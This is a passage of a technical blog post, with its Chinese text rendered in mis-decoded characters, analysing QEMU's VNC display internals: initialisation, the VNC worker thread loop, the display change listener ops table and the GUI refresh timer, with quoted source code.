QTAILQ_INIT(&amp;vd-&gt;clients);<br>    vd-&gt;expires = TIME_MAX;<br><br>    <span class="hljs-keyword">if</span> (keyboard_layout) &#123;  <span class="hljs-comment">// åˆå§‹åŒ–é”®ç›˜å¸ƒå±€</span><br>        trace_vnc_key_map_init(keyboard_layout);<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym,<br>                                              keyboard_layout, errp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym, <span class="hljs-string">&quot;en-us&quot;</span>, errp);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vd-&gt;kbd_layout) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    vd-&gt;share_policy = VNC_SHARE_POLICY_ALLOW_EXCLUSIVE;<br>    vd-&gt;connections_limit = <span class="hljs-number">32</span>;<br><br>    qemu_mutex_init(&amp;vd-&gt;mutex);<br>    vnc_start_worker_thread();  <span class="hljs-comment">// å¯åŠ¨ VNC çš„ worker çº¿ç¨‹</span><br><br>    vd-&gt;dcl.ops = &amp;dcl_ops; <span class="hljs-comment">// è®¾ç½® DisplayChangeListener çš„ ops</span><br>    register_displaychangelistener(&amp;vd-&gt;dcl);<br>    vd-&gt;kbd = qkbd_state_init(vd-&gt;dcl.con);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ª VncDisplayï¼ŒåŠ å…¥åˆ°å…¨å±€é“¾è¡¨ä¸­</li><li>åˆå§‹åŒ–é”®ç›˜å¸ƒå±€</li><li>å¯åŠ¨ VNC worker threadï¼ˆè‹¥æœªå¯åŠ¨ï¼‰ï¼Œç”± worker thread å°†å›¾åƒä¿¡æ¯å‘é€ç»™ client</li><li>è®¾ç½®è¯¥ VncDisplay å¯¹åº”çš„ DisplayChangeListener çš„ ops ä¸º <code>dcl_ops</code></li><li>è°ƒç”¨ <code>register_displaychangelistener()</code> æ³¨å†Œè¯¥ VncDisplay å¯¹åº”çš„ DisplayChangeListener</li></ul><h3 id="Iã€VNC-worker-thread-å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯"><a href="#Iã€VNC-worker-thread-å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯" class="headerlink" title="Iã€VNC worker thread - å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯"></a>Iã€VNC worker thread - å°†å›¾åƒæ›´æ–°å‘é€ç»™å®¢æˆ·ç«¯</h3><p><code>vnc worker thread</code> æ˜¯ Qemu ä¸­ VNC æœåŠ¡ä¸­çš„ä¸€ä¸ªé‡è¦çš„çº¿ç¨‹ï¼Œå…¶ç”¨ä»¥æŒç»­åœ°å¤„ç†æŒ‚è½½åœ¨å…¨å±€çš„ VncJobQueue ä¸Šçš„ VncJobï¼Œå¹¶å°†å›¾åƒæ›´æ–°æ•°æ®å‘é€ç»™ vnc å®¢æˆ·ç«¯</p><p>åœ¨ <code>vnc_display_init()</code> ä¸­åˆ›å»º VncDisplay å®ä¾‹æ—¶ï¼Œå…¶è¿˜ä¼šè°ƒç”¨ <code>vnc_start_worker_thread()</code> å¯åŠ¨ vnc worker threadï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">vnc_worker_thread_running</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">queue</span>; <span class="hljs-comment">/* Check global queue */</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_start_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    VncJobQueue *q;<br><br>    <span class="hljs-keyword">if</span> (vnc_worker_thread_running())<br>        <span class="hljs-keyword">return</span> ;<br><br>    q = vnc_queue_init();<br>    qemu_thread_create(&amp;q-&gt;thread, <span class="hljs-string">&quot;vnc_worker&quot;</span>, vnc_worker_thread, q,<br>                       QEMU_THREAD_DETACHED);<br>    <span class="hljs-built_in">queue</span> = q; <span class="hljs-comment">/* Set global queue */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥çº¿ç¨‹çš„æœ¬ä½“ä¾¿æ˜¯ <code>vnc_worker_thread</code> å‡½æ•°ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªé‡å¤è°ƒç”¨ <code>vnc_worker_thread_loop</code> çš„å¤§å¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">vnc_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    VncJobQueue *<span class="hljs-built_in">queue</span> = arg;<br><br>    qemu_thread_get_self(&amp;<span class="hljs-built_in">queue</span>-&gt;thread);<br><br>    <span class="hljs-keyword">while</span> (!vnc_worker_thread_loop(<span class="hljs-built_in">queue</span>)) ;<br>    vnc_queue_clear(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>vnc_worker_thread_loop</code> å®šä¹‰å¦‚ä¸‹ï¼Œè¯¥å‡½æ•°ä¼šä¸€ç›´ç­‰å¾…åˆ°å…¨å±€çš„ VncJobQueue çš„ VncJob é“¾è¡¨éç©ºï¼Œå•æ¬¡è°ƒç”¨å¤„ç†ä¸€ä¸ª VncJobï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vnc_worker_thread_loop</span><span class="hljs-params">(VncJobQueue *<span class="hljs-built_in">queue</span>)</span><br>&#123;<br>    VncJob *job;<br>    VncRectEntry *entry, *tmp;<br>    VncState vs = &#123;&#125;;<br>    <span class="hljs-type">int</span> n_rectangles;<br>    <span class="hljs-type">int</span> saved_offset;<br><br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);  <span class="hljs-comment">// ç­‰å¾…å…¨å±€ queue ä¸ä¸ºç©º</span><br>    <span class="hljs-keyword">while</span> (QTAILQ_EMPTY(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs) &amp;&amp; !<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        qemu_cond_wait(&amp;<span class="hljs-built_in">queue</span>-&gt;cond, &amp;<span class="hljs-built_in">queue</span>-&gt;mutex);<br>    &#125;<br>    <span class="hljs-comment">/* Here job can only be NULL if queue-&gt;exit is true */</span><br>    job = QTAILQ_FIRST(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs);  <span class="hljs-comment">// å–ä¸‹ç¬¬ä¸€ä¸ª job</span><br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    assert(job-&gt;vs-&gt;magic == VNC_MAGIC);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span>-&gt;<span class="hljs-built_in">exit</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    vnc_lock_output(job-&gt;vs);  <span class="hljs-comment">// é”ä¸Š VncState</span><br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span> || job-&gt;vs-&gt;<span class="hljs-built_in">abort</span> == <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// io channel ä¸ºç©ºæˆ– abort ä¸ºçœŸï¼Œæ–­å¼€è¿æ¥</span><br>        vnc_unlock_output(job-&gt;vs);<br>        <span class="hljs-keyword">goto</span> disconnected;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (buffer_empty(&amp;job-&gt;vs-&gt;output)) &#123;<br>        <span class="hljs-comment">// è¿™é‡Œçš„ output ä¸º Buffer ç±»å‹ï¼Œç±»ä¼¼äº iovecï¼ŒåŒ…å«ç€é•¿åº¦ä¸ä¸€ä¸ªæŒ‡å‘ buffer çš„æŒ‡é’ˆ</span><br>        <span class="hljs-comment">// buffer_move_empty(*to, *from) çš„ä½œç”¨å°±æ˜¯é‡Šæ”¾ to çš„ bufferï¼Œå°† from çš„ buffer ç»™åˆ° to çš„ buffer</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Looks like a NOP as it obviously moves no data.  But it</span><br><span class="hljs-comment">         * moves the empty buffer, so we don&#x27;t have to malloc a new</span><br><span class="hljs-comment">         * one for vs.output</span><br><span class="hljs-comment">         */</span><br>        buffer_move_empty(&amp;vs.output, &amp;job-&gt;vs-&gt;output);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>    <span class="hljs-comment">/* Make a local copy of vs and switch output buffers */</span><br>    vnc_async_encoding_start(job-&gt;vs, &amp;vs);<br>    vs.magic = VNC_MAGIC;<br><br>    <span class="hljs-comment">/* Start sending rectangles */</span><br>    n_rectangles = <span class="hljs-number">0</span>;<br>    vnc_write_u8(&amp;vs, VNC_MSG_SERVER_FRAMEBUFFER_UPDATE);<br>    vnc_write_u8(&amp;vs, <span class="hljs-number">0</span>);<br>    saved_offset = vs.output.offset;<br>    vnc_write_u16(&amp;vs, <span class="hljs-number">0</span>);<br><br>    vnc_lock_display(job-&gt;vs-&gt;vd);<br>    <span class="hljs-comment">// éå†è¯¥ job ä¸Šçš„ VncRectï¼Œå‘é€ç»™ client</span><br>    QLIST_FOREACH_SAFE(entry, &amp;job-&gt;rectangles, next, tmp) &#123;<br>        <span class="hljs-type">int</span> n;<br><br>        <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// io channel ä¸ºç©ºï¼Œæ–­å¼€è¿æ¥</span><br>            vnc_unlock_display(job-&gt;vs-&gt;vd);<br>            <span class="hljs-comment">/* Copy persistent encoding data */</span><br>            vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>            <span class="hljs-keyword">goto</span> disconnected;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (vnc_worker_clamp_rect(&amp;vs, job, &amp;entry-&gt;rect)) &#123;<br>            <span class="hljs-comment">// å‘é€ buffer</span><br>            n = vnc_send_framebuffer_update(&amp;vs, entry-&gt;rect.x, entry-&gt;rect.y,<br>                                            entry-&gt;rect.w, entry-&gt;rect.h);<br><br>            <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">0</span>) &#123;<br>                n_rectangles += n;<br>            &#125;<br>        &#125;<br>        g_free(entry);<br>    &#125;<br>    trace_vnc_job_nrects(&amp;vs, job, n_rectangles);<br>    vnc_unlock_display(job-&gt;vs-&gt;vd);<br><br>    <span class="hljs-comment">/* Put n_rectangles at the beginning of the message */</span><br>    vs.output.buffer[saved_offset] = (n_rectangles &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    vs.output.buffer[saved_offset + <span class="hljs-number">1</span>] = n_rectangles &amp; <span class="hljs-number">0xFF</span>;<br><br>    vnc_lock_output(job-&gt;vs);<br>    <span class="hljs-keyword">if</span> (job-&gt;vs-&gt;ioc != <span class="hljs-literal">NULL</span>) &#123;<br>        buffer_move(&amp;job-&gt;vs-&gt;jobs_buffer, &amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br><br>        qemu_bh_schedule(job-&gt;vs-&gt;bh);<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>        buffer_reset(&amp;vs.output);<br>        <span class="hljs-comment">/* Copy persistent encoding data */</span><br>        vnc_async_encoding_end(job-&gt;vs, &amp;vs);<br>    &#125;<br>    vnc_unlock_output(job-&gt;vs);<br><br>disconnected:<br>    vnc_lock_queue(<span class="hljs-built_in">queue</span>);<br>    QTAILQ_REMOVE(&amp;<span class="hljs-built_in">queue</span>-&gt;jobs, job, next);<br>    vnc_unlock_queue(<span class="hljs-built_in">queue</span>);<br>    qemu_cond_broadcast(&amp;<span class="hljs-built_in">queue</span>-&gt;cond);<br>    g_free(job);<br>    vs.magic = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥å…¨å±€ queue çš„ job é“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼Œè‹¥æ˜¯åˆ™è¿›å…¥ç¡çœ ç­‰å¾…</li><li>é”ä¸Šç¬¬ä¸€ä¸ª jobï¼Œæ£€æŸ¥å¯¹åº” VncState çš„ IO channel æ˜¯å¦ä¸ºç©ºï¼Œè‹¥æ˜¯åˆ™è·³åˆ°ç»“æŸå‘é€</li><li>è‹¥ VncState çš„ output buffer ï¼ˆBuffer ç±»å‹ï¼Œç±»ä¼¼äº iovecï¼Œæœ‰é•¿åº¦å’ŒæŒ‡å‘å®é™… buffer çš„æŒ‡é’ˆï¼‰çš„ offset ä¸º 0ï¼Œåˆ™å°†å…¶ç»™åˆ°å‡½æ•°å†…ä¸´æ—¶åˆ›å»ºçš„ VncState çš„ output bufferï¼ŒåŸ buffer è®¾ä¸º NULL</li><li>éå†è¯¥ job ä¸Šçš„ VncRectï¼Œå‘é€ç»™ clientï¼Œè‹¥ io channel ä¸ºç©ºï¼Œåˆ™è·³åˆ°ç»“æŸå‘é€</li><li>è‹¥ VncState çš„ io channel ä¸ä¸ºç©ºï¼Œåˆ™å°†å‡½æ•°å†…ä¸´æ—¶åˆ›å»ºçš„ VncState çš„ output buffer ç»™å›åŸ VncState</li><li>ï¼ˆç»“æŸå‘é€ï¼‰ä»å…¨å±€ queue ä¸Šå–ä¸‹è¯¥ job å¹¶é‡Šæ”¾</li></ul><h3 id="IIã€VNC-çš„-dcl-ops"><a href="#IIã€VNC-çš„-dcl-ops" class="headerlink" title="IIã€VNC çš„ dcl_ops"></a>IIã€VNC çš„ dcl_ops</h3><p>åœ¨ <code>vnc_display_init()</code> ä¸­åˆ›å»º VncDisplay å®ä¾‹æ—¶ä¼šå°†å…¶ DisplayChangeListener çš„å‡½æ•°è¡¨åˆå§‹åŒ–ä¸º <code>dcl_ops</code> å‡½æ•°è¡¨ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> DisplayChangeListenerOps dcl_ops = &#123;<br>    .dpy_name             = <span class="hljs-string">&quot;vnc&quot;</span>,<br>    .dpy_refresh          = vnc_refresh,<br>    .dpy_gfx_update       = vnc_dpy_update,<br>    .dpy_gfx_switch       = vnc_dpy_switch,<br>    .dpy_gfx_check_format = qemu_pixman_check_format,<br>    .dpy_mouse_set        = vnc_mouse_set,<br>    .dpy_cursor_define    = vnc_dpy_cursor_define,<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸­ä¸»è¦éƒ½æ˜¯ä¸ vnc ç›¸å…³çš„æ“ä½œå‡½æ•°ï¼Œåé¢æ¶‰åŠåˆ°å…·ä½“å‡½æ•°æ—¶æˆ‘ä»¬å†å±•å¼€åˆ†æ</p><h3 id="IIIã€register-displaychangelistener-æ³¨å†Œ-dclï¼Œå¯åŠ¨-timer"><a href="#IIIã€register-displaychangelistener-æ³¨å†Œ-dclï¼Œå¯åŠ¨-timer" class="headerlink" title="IIIã€register_displaychangelistener - æ³¨å†Œ dclï¼Œå¯åŠ¨ timer"></a>IIIã€register_displaychangelistener - æ³¨å†Œ dclï¼Œå¯åŠ¨ timer</h3><p>è¯¥å‡½æ•°å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_displaychangelistener</span><span class="hljs-params">(DisplayChangeListener *dcl)</span><br>&#123;<br>    QemuConsole *con;<br><br>    assert(!dcl-&gt;ds);<br><br>    trace_displaychangelistener_register(dcl, dcl-&gt;ops-&gt;dpy_name);<br>    dcl-&gt;ds = get_alloc_displaystate();<br>    QLIST_INSERT_HEAD(&amp;dcl-&gt;ds-&gt;listeners, dcl, next);<br>    gui_setup_refresh(dcl-&gt;ds);<br>    <span class="hljs-keyword">if</span> (dcl-&gt;con) &#123;<br>        dcl-&gt;con-&gt;dcls++;<br>        con = dcl-&gt;con;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        con = active_console;<br>    &#125;<br>    displaychangelistener_display_console(dcl, con, dcl-&gt;con ? &amp;error_fatal : <span class="hljs-literal">NULL</span>);<br>    text_console_update_cursor(<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦åšäº†è¿™äº›äº‹æƒ…ï¼š</p><ul><li>å°† dcl æ’åˆ°å¯¹åº” DisplayState çš„ listeners é“¾è¡¨ä¸Š</li><li>è°ƒç”¨ <code>gui_setup_refresh()</code> å¯åŠ¨ä¸€ä¸ª Qemu Timer</li><li>è°ƒç”¨ <code>displaychangelistener_display_console()</code> è¿›è¡Œç›¸å…³åˆå§‹åŒ–æ“ä½œï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>dcl-&gt;ops</code> ä¸­å‡½æ•°</li></ul><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨ <code>gui_setup_refresh()</code>ï¼Œå…¶ä¼šå¯åŠ¨ä¸€ä¸ª Qemu å®šæ—¶å™¨ï¼Œå®šæœŸåœ°åˆ·æ–° frame bufferï¼Œè¿™ä¹Ÿæ˜¯æ›´æ–°æ˜¾å¡æ•°æ®çš„æ ¸å¿ƒï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_setup_refresh</span><span class="hljs-params">(DisplayState *ds)</span><br>&#123;<br>    DisplayChangeListener *dcl;<br>    <span class="hljs-type">bool</span> need_timer = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_gfx = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">bool</span> have_text = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_refresh != <span class="hljs-literal">NULL</span>) &#123;<br>            need_timer = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_gfx_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_gfx = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (dcl-&gt;ops-&gt;dpy_text_update != <span class="hljs-literal">NULL</span>) &#123;<br>            have_text = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (need_timer &amp;&amp; ds-&gt;gui_timer == <span class="hljs-literal">NULL</span>) &#123;<br>        ds-&gt;gui_timer = timer_new_ms(QEMU_CLOCK_REALTIME, gui_update, ds);<br>        timer_mod(ds-&gt;gui_timer, qemu_clock_get_ms(QEMU_CLOCK_REALTIME));<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!need_timer &amp;&amp; ds-&gt;gui_timer != <span class="hljs-literal">NULL</span>) &#123;<br>        timer_free(ds-&gt;gui_timer);<br>        ds-&gt;gui_timer = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    ds-&gt;have_gfx = have_gfx;<br>    ds-&gt;have_text = have_text;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ dcl-&gt;ops çš„ <code>dpy_refresh</code> æŒ‡é’ˆéç©º<strong>ä¸”å½“å‰ DisplayState æœªè®¾ç½® timer æ—¶</strong>ï¼Œä¾¿ä¼šè°ƒç”¨ <code>timer_new_ms()</code> æ–°å»ºä¸€ä¸ªæ¯«ç§’çº§åˆ«çš„å®šæ—¶å™¨ï¼Œå®šæ—¶è°ƒç”¨ <code>gui_update()</code> åˆ·æ–°æ˜¾å­˜ï¼Œæ¥æ”¶çš„å‚æ•°ä¾¿ä¸ºè¯¥ DisplayState</p><h1 id="0x03-æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°"><a href="#0x03-æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°" class="headerlink" title="0x03.æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°"></a>0x03.æ˜¾ç¤ºè®¾å¤‡æ›´æ–°ç›¸å…³å‡½æ•°</h1><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œåœ¨ Qemu å¯åŠ¨æ—¶ä¼šå¯åŠ¨ä¸€ä¸ª Timer å®šæ—¶è¿›è¡Œæ˜¾å­˜çš„åˆ·æ–°ï¼Œå…¶ä»£ç è°ƒç”¨å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p><h2 id="ä¸€ã€gui-update-timer-å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ"><a href="#ä¸€ã€gui-update-timer-å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ" class="headerlink" title="ä¸€ã€gui_update - timer å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ"></a>ä¸€ã€gui_update - timer å®šæ—¶è°ƒç”¨è¿›è¡Œæ›´æ–°æ“ä½œ</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹ <code>gui_update()</code> è¿™ä¸ªç”± timer å®šæ—¶è°ƒç”¨çš„å‡½æ•°ï¼Œå…¶å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">gui_update</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> interval = GUI_REFRESH_INTERVAL_IDLE;<br>    <span class="hljs-type">uint64_t</span> dcl_interval;<br>    DisplayState *ds = opaque;<br>    DisplayChangeListener *dcl;<br>    QemuConsole *con;<br><br>    ds-&gt;refreshing = <span class="hljs-literal">true</span>;<br>    dpy_refresh(ds);<br>    ds-&gt;refreshing = <span class="hljs-literal">false</span>;<br><br>    QLIST_FOREACH(dcl, &amp;ds-&gt;listeners, next) &#123;<br>        dcl_interval = dcl-&gt;update_interval ?<br>            dcl-&gt;update_interval : GUI_REFRESH_INTERVAL_DEFAULT;<br>        <span class="hljs-keyword">if</span> (interval &gt; dcl_interval) &#123;<br>            interval = dcl_interval;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ds-&gt;update_interval != interval) &#123;<br>        ds-&gt;update_interval = interval;<br>        QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>            <span class="hljs-keyword">if</span> (con-&gt;hw_ops-&gt;update_interval) &#123;<br>                con-&gt;hw_ops-&gt;update_interval(con-&gt;hw, interval);<br>            &#125;<br>        &#125;<br>        trace_console_refresh(interval);<br>    &#125;<br>    ds-&gt;last_update = qemu_clock_get_ms(QEMU_CLOCK_REALTIME);<br>    timer_mod(ds-&gt;gui_timer, ds-&gt;last_update + interval);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è°ƒç”¨ <code>dpy_refresh()</code> ï¼Œè¯¥å‡½æ•°ä¼šéå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListener å¹¶è°ƒç”¨ <code>dcl-&gt;ops-&gt;dpy_refresh()</code></li><li>éå† DisplayState ä¸­çš„æ‰€æœ‰ DisplayChangeListenerï¼Œæ£€æŸ¥ <code>dcl-&gt;update_interval</code></li><li>è‹¥ <code>ds-&gt;update_interval != interval</code>ï¼Œéå†æ‰€æœ‰çš„ QemuConsole å¹¶è°ƒç”¨ <code>con-&gt;hw_ops-&gt;update_interval()</code> è¿›è¡Œç¡¬ä»¶æ•°æ®æ›´æ–°</li></ul><h2 